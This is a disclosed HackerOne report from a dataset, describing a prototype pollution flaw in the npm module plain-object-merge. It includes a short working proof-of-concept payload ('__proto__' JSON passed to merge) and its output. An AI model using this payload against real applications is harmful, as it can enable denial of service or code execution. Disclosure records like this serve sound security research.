---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '871156'
original_report_id: '871156'
title: '[plain-object-merge] Prototype pollution'
weakness: Modification of Assumed-Immutable Data (MAID)
team_handle: nodejs-ecosystem
created_at: '2020-05-11T22:23:34.390Z'
disclosed_at: '2021-03-13T19:30:53.402Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- modification-of-assumed-immutable-data-maid
---

# [plain-object-merge] Prototype pollution

## Metadata

- HackerOne Report ID: 871156
- Weakness: Modification of Assumed-Immutable Data (MAID)
- Program: nodejs-ecosystem
- Disclosed At: 2021-03-13T19:30:53.402Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a `prototype pollution` vulnerability in `plain-object-merge` module.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `plain-object-merge`
**version:** `1.0.1`
**npm page:** `https://www.npmjs.com/package/plain-object-merge`

## Module Description

Extremely fast function optimized for deep merging json-serializable plain objects.

## Module Stats

[20] weekly downloads

# Vulnerability

## Vulnerability Description

The `merge` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `plain-object-merge` module:
    - `npm i plain-object-merge`

Create an object with `__proto__` property and pass it to the `merge` function:
```javascript

const merge = require('plain-object-merge');
const payload =  JSON.parse('{"__proto__":{"polluted":"yes"}}');
const obj = {};
console.log("Before : " + obj.polluted);
merge([{}, payload]);
console.log("After : " + obj.polluted);
```
Output:
```console

Before : undefined
After : yes
```
{F824411}

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.5

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
